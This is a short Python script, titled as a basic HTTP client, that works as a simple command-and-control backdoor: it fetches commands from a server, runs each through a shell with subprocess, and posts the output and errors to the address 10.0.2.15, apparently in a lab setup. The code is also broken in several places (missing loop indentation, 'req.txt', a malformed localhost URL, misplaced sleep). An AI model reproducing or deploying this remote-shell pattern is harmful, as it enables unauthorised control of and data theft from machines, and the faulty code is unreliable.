# Basic Http Client 

import subprocess
import requests
import time

while True:

req = requests.get('http://localhost<127.0.0.1>')
command = req.txt

if 'terminate' in command:
    break
else:
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,  stdin=subprocess.PIPE)
    post_response =  requests.post(url='http://10.0.2.15',data = CMD.stdout.read() )
    post_response =  requests.post(url='http://10.0.2.15',data = CMD.stderr.read() )
    
time.sleep(1000)  ########## for fun
